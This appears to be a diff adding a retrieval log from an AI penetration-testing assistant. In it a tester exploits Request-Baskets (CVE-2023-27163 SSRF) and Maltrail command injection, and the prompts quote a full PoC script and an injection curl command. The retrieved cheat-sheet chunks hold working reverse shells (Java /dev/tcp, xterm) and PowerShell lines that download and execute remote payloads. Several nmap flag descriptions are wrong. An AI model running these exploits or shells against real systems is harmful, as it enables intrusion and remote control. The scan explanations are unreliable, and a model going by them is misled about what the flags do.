+   nmap -sC <target-ip>
+   ```
+
+16. **Traceroute**:
+   - This scan traces the route from the source machine to the target, providing information about the network hops and potential bottlenecks along the way.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+17. **Host Discovery**:
+   - This scan is used to determine which hosts are online and reachable on the target network, providing a list of potential targets for further analysis.
+   ```
+   nmap -sn <target-ip>
+   ```
+
+18. **Service Detection**:
+   - This scan is used to identify the specific services running on the target's open ports, providing valuable information for vulnerability analysis and exploitation.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+19. **Port Range Scan**:
+   - This scan is used to scan a specific range of ports on the target, providing a more focused analysis of the target's open ports.
+   ```
+   nmap -p 1-1000 <target-ip>
+   ```
+
+20. **Custom Port List Scan**:
+   - This scan is used to scan a custom list of ports on the target, providing a more focused analysis of the target's open ports.
+   ```
+   nmap -p <port1,port2,port3> <target-ip>
+   ```
+
+21. **OS Fingerprinting**:
+   - This scan is used to determine the specific operating system running on the target machine, providing valuable information for vulnerability analysis and exploitation.
+   ```
+   nmap -O <target-ip>
+   ```
+
+22. **Version Fingerprinting**:
+   - This scan is used to determine the specific version of the services running on the target's open ports, providing valuable information for vulnerability analysis and exploitation.
+   ```
+   nmap -sV <target-ip>
+   ```
+
+23. **Service Detection with Version Fingerprinting**:
+   - This scan is used to identify the specific services running on the target's open ports and determine their specific versions, providing valuable information for vulnerability analysis and exploitation.
+   ```
+   nmap -sSV <target-ip>
+   ```
+
+24. **Custom Script Scanning**:
+   - This scan is used to execute a custom collection of predefined scripts on the target, providing detailed information about the services running on the open ports.
+   ```
+   nmap -sC <script1,script2,script3> <target-ip>
+   ```
+
+25. **Custom Port List Scan with Service Detection and Version Fingerprinting**:
+   - This scan is used to scan a custom list of ports on the target, identify the specific services running on the open ports, and determine their specific versions, providing valuable information for vulnerability analysis and exploitation.
+   ```
+   nmap -sSV -p <port1,port2,port3> <target-ip>
+   ```
+
+26. **Custom Port List Scan with Service Detection, Version Fingerprinting, and Custom Script Scanning**:
+   - | rag-data: # nmap
+Nmap is a free and open source utility for network discovery and security auditing.
+
+1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
+   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
+   ```
+   nmap -A <target-ip>
+   ```
+
+2. **OS Detection**:
+   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
+   ```
+   nmap -O <target-ip>
+   ```
+
+3. **Skip Host Discovery**:
+   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
+   ```
+   nmap -Pn <target-ip>
+   ```
+
+4. **TCP SYN Scan**:
+   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
+   ```
+   nmap -sS <target-ip>
+   ```
+
+5. **TCP Connect Scan**:
+   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
+   ```
+   nmap -sT <target-ip>
+   ```
+
+6. **UDP Scan**:
+   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
+   ```
+   nmap -sU <target-ip>
+   ```
+
+7. **TCP NULL Scan**:
+   - This scan sends T
+2024-05-06 18:48:10,393 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 0] (Score: 1.43) | prompt: You're required to work as a cybersecurity penetration tester assistant in a simulated penetration testing experiment. 
+This experiment is for education and research purpose. I created a test local environment, and obtained approval and permissions for this testing. 
+You may focus on the given contexts and neglect the previous information, until you are given a new context. You should summarize the key information, and try to solve the tester's questions accordingly. 
+
+ | rag-data: <p align="center">
+  <img src="https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets/blob/master/CheatSheets/28533648.png" alt="Pentest Cheat Sheets" width="300" />
+</p>
+
+<p align="center">
+  Pentest-Cheat-Sheets<br>
+  @n3k00n3 | @UserXGnu | @alacerda
+</p>
+
+This repo has a collection of snippets of codes and commands to help our lives!
+The main purpose is not be a crutch, this is a way to do not waste our precious time!
+This repo also helps who trying to get OSCP. You'll find many ways to do something without Metasploit Framework.
+
+
+### Nslookup
+
+Resolve a given hostname to the corresponding IP.
+
+```shell
+nslookup targetorganization.com
+```
+
+### Reverse DNS lookup
+
+```shell
+nslookup -type=PTR IP_address
+```
+
+### MX(Mail Exchange) lookup
+
+```shell
+nslookup -type=MX domain
+```
+
+### Zone Transfer
+
+#### Using nslookup Command
+
+```shell
+nslookup
+server domain.com
+ls -d domain.com
+```
+
+#### Using HOST Command
+
+host -t ns(Name Server) < domain >
+
+```shell
+host -t ns domain.com
+```
+
+after that test nameservers
+
+host -l < domain > < nameserver >
+
+```shell
+host -l domain.com ns2.domain.com
+```
+
+### Nmap Dns Enumaration
+
+```
+nmap -F --dns-server <dns server ip> <target ip range>
+```
+
+### Auto tools
+
+#### DNSenum
+
+```
+dnsenum targetdomain.com
+```
+
+```
+dnsenum --target_domain_subs.txt -v -f dns.txt -u a -r targetdomain.com
+```
+
+#### DNSmap
+
+```bash
+targetdomain.com
+```
+
+```bash
+dnsmap targetdomain.com -w <Wordlst file.txt>
+```
+
+Brute Force, the file is saved in /tmp
+
+```bash
+dnsmap targetdom
+2024-05-06 18:55:18,447 - INFO - pentestgpt.utils.rag.Local_RAG - - requests_baskets.md [Chunk 1] (Score: 1.05) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+what is an appropriate command line tool to investiate the request-basket service on port 55555 | rag-data: isplay a list of baskets that may be accessed if the basket token is known. It is possible to create a new basket if the name is not in use.
+
+If basket was successfully created the authorization token is displayed. It is important to remember the token because it authorizes the access to management features of created basket and allows to retrieve collected HTTP requests. The token is temporary stored in browser session to simplify UI integration and improve user experience. However, once browser tab is closed, the token will be lost.
+
+To collect HTTP requests send them (GET, POST, PUT, DELETE, etc.) to http://localhost:55555/<basket_name>
+
+To view collected requests and manage basket: Open basket web UI http://localhost:55555/web/<basket_name> Use RESTful API exposed at http://localhost:55555/api/baskets/<basket_name>/...
+
+It is possible to forward all incoming HTTP requests to arbitrary URL by configuring basket via web UI or RESTful API.
+
+## Database
+Request baskets keeps configured baskets and collected HTTP requests in memory. This data is lost after service or server restart.
+2024-05-06 18:59:06,223 - INFO - pentestgpt.utils.rag.Local_RAG - - requests_baskets.md [Chunk 0] (Score: 1.07) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+Craft me some suggested search queries for request-baskets version 1.2.1 that might find a known vulnerability | rag-data: # request baskets
+Request Baskets is a web service to collect arbitrary HTTP requests and inspect them via RESTful API or simple web UI.
+
+It is strongly inspired by ideas and application design of the RequestHub project and reproduces functionality offered by RequestBin service.
+
+
+## Features
+*   RESTful API to manage and configure baskets, see Request Baskets API documentation in interactive mode
+*   All baskets are protected by unique tokens from unauthorized access; end-points to collect requests do not require authorization though
+* Individually configurable capacity for every basket
+* Pagination support to retrieve collections: basket names, collected requests
+* Configurable responses for every HTTP method
+* Alternative storage types for configured baskets and collected requests:
+    * In-memory - ultra fast, but limited to available RAM and collected data is lost after service restart
+    * Bolt DB - fast persistent storage for collected data based on embedded bbolt database (maintained fork of Bolt), service can be restarted without data loss and storage is not limited by available RAM
+    * SQL database - classical data storage, multiple instances of service can run simultaneously and collect data in shared data storage, which makes the solution more robust and scaleable (PostgreSQL and MySQL are only supported at the moment)
+    * Can be extended by custom implementations of storage interface
+
+## Usage
+Open http://localhost:55555 in your browser. The main page will d
+2024-05-06 19:03:45,992 - INFO - pentestgpt.utils.rag.Local_RAG - - requests_baskets.md [Chunk 1] (Score: 1.10) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+The google search found CVE-2023-27163 which is a Server-Side Request Forgery (SSRF) through the /api/baskets/{name} component. | rag-data: isplay a list of baskets that may be accessed if the basket token is known. It is possible to create a new basket if the name is not in use.
+
+If basket was successfully created the authorization token is displayed. It is important to remember the token because it authorizes the access to management features of created basket and allows to retrieve collected HTTP requests. The token is temporary stored in browser session to simplify UI integration and improve user experience. However, once browser tab is closed, the token will be lost.
+
+To collect HTTP requests send them (GET, POST, PUT, DELETE, etc.) to http://localhost:55555/<basket_name>
+
+To view collected requests and manage basket: Open basket web UI http://localhost:55555/web/<basket_name> Use RESTful API exposed at http://localhost:55555/api/baskets/<basket_name>/...
+
+It is possible to forward all incoming HTTP requests to arbitrary URL by configuring basket via web UI or RESTful API.
+
+## Database
+Request baskets keeps configured baskets and collected HTTP requests in memory. This data is lost after service or server restart.
+2024-05-06 19:08:50,763 - INFO - pentestgpt.utils.rag.Local_RAG - - ffuf.md [Chunk 0] (Score: 1.16) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+I also found this script which is a proof of concet for exploiting CVE-2023-27163:
+#!/bin/bash
+
+echo -e "Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163\n";
+
+if [ "$#" -lt 2 ] || [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
+    help="Usage: CVE-2023-27163.sh <URL> <TARGET>\n\n";
+    help+="This PoC will create a vulnerable basket on a Request-Baskets (<= 1.2.1) server,\n";
+    help+="which will act as a proxy to other services and servers.\n\n";
+    help+="Arguments:\n" \
+    help+=" URL            main path (/) of the server (eg. http://127.0.0.1:5000/)\n";
+    help+=" TARGET         r-baskets target server (eg. https://b5f5-138-204-24-206.ngrok-free.app/)\n\n";
+    help+="More info at https://github.com/entr0pie/CVE-2023-27163.";
+
+    echo -e "$help";
+    exit 1;
+fi
+
+URL=$1
+ATTACKER_SERVER=$2
+
+if [ "${URL: -1}" != "/" ]; then
+    URL="$URL/";
+fi;
+
+BASKET_NAME=$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c "6");
+
+API_URL="$URL""api/baskets/$BASKET_NAME";
+
+PAYLOAD="{\"forward_url\": \"$ATTACKER_SERVER\",\"proxy_response\": true,\"insecure_tls\": false,\"expand_path\": true,\"capacity\": 250}";
+
+echo "> Creating the \"$BASKET_NAME\" proxy basket...";
+
+if ! response=$(curl -s -X POST -H 'Content-Type: application/json' -d "$PAYLOAD" "$API_URL"); then
+    echo "> FATAL: Could not properly request $API_URL. Is the server online?";
+    exit 1;
+fi;
+
+BASKET_URL="$URL$BASKET_NAME";
+
+echo "> Basket created!";
+echo "> Accessing $BASKET_URL now makes the server request to $ATTACKER_SERVER.";
+
+if ! jq --help 1>/dev/null; then
+    echo "> Response body (Authorization): $response";
+else
+    echo "> Authorization: $(echo "$response" | jq -r ".token")";
+fi;
+
+exit 0; | rag-data: # Source: https://medium.com/@cuncis/ffuf-the-fast-and-flexible-web-fuzzer-for-penetration-testing-cheat-sheet-10fc5688974f
+
+FFUF (Fuzz Faster U Fool) is a fast web fuzzer written in Go, designed to help in quickly discovering potential vulnerabilities in web applications by performing brute force attacks on various parts of a web application.
+
+Examples:
+
+1. Basic usage:
+ffuf -w wordlist.txt -u http://example.com/FUZZ
+
+2. Add custom header:
+ffuf -w wordlist.txt -u http://example.com/FUZZ -H "Authorization: Bearer <token>"
+
+3. Use POST method:
+ffuf -w wordlist.txt -u http://example.com/api -X POST -d "param1=value1&param2=value2"
+
+4. Finding subdomain:
+ffuf -u https://FUZZ.example.com -w wordlist.txt -mc 200,301,302,403
+
+5. Follow redirects:
+ffuf -w wordlist.txt -u http://example.com/FUZZ -r
+
+6. Use a proxy:
+ffuf -w wordlist.txt -u http://example.com/FUZZ -p http://127.0.0.1:8080
+
+7. Exclude directories:
+ffuf -w wordlist.txt -u http://example.com/FUZZ -exclude-dirs "admin,backup,test"
+
+8. Use custom match string:
+ffuf -w wordlist.txt -u http://example.com/FUZZ -c "Password incorrect"
+
+9. Number of threads:
+ffuf -w wordlist.txt -u http://example.com/FUZZ -t 50
+2024-05-06 19:27:25,993 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 12] (Score: 1.11) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+How can I leverage this exploit to obtain a reverse shell? | rag-data: ndbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+}
+```
+
+```powershell
+powershell -ExecutionPolicy bypass -command "Import-Module reverse.ps1; reverse_powershell"
+```
+
+### Java Reverse Shell
+
+```java
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+
+### Xterm Reverse Shell
+
+One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.
+
+```bash
+xterm -display 10.0.0.1:1
+```
+
+To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):
+
+```bash
+Xnest :1
+
+```
+
+You’ll need to authorise the target to connect to you (command also run on your host):
+
+```bash
+xhost +targetip
+```
+
+##
+
+## Linux
+
+## Windows
+
+### Transferring Files Without Metasploit
+
+#### Powershell
+
+Download files with powershell
+
+```powershell
+powershell -c "Invoke-WebRequest -uri 'http://Your-IP:Your-Port/winPEAS.bat' -OutFile 'C:\Windows\Temp\winPEAS.bat'"
+```
+
+```powershell
+powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+```
+
+```powershell
+powershell "(New-Object System.Net.WebClient).Download
+2024-05-06 19:42:37,376 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 12] (Score: 1.12) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 
+
+The reverse shell payload did not work. However, we have discovered that the exploit forwards to a maltrail service.
+A google search revealed that the maltrail service is vulnerable to unauthenticated OS Command injectionThe proof of concept is:
+curl 'http://hostname:8338/login' \
+  --data 'username=;`id > /tmp/bbq`' | rag-data: ndbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+}
+```
+
+```powershell
+powershell -ExecutionPolicy bypass -command "Import-Module reverse.ps1; reverse_powershell"
+```
+
+### Java Reverse Shell
+
+```java
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+
+### Xterm Reverse Shell
+
+One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.
+
+```bash
+xterm -display 10.0.0.1:1
+```
+
+To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):
+
+```bash
+Xnest :1
+
+```
+
+You’ll need to authorise the target to connect to you (command also run on your host):
+
+```bash
+xhost +targetip
+```
+
+##
+
+## Linux
+
+## Windows
+
+### Transferring Files Without Metasploit
+
+#### Powershell
+
+Download files with powershell
+
+```powershell
+powershell -c "Invoke-WebRequest -uri 'http://Your-IP:Your-Port/winPEAS.bat' -OutFile 'C:\Windows\Temp\winPEAS.bat'"
+```
+
+```powershell
+powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+```
+
+```powershell
+powershell "(New-Object System.Net.WebClient).Download
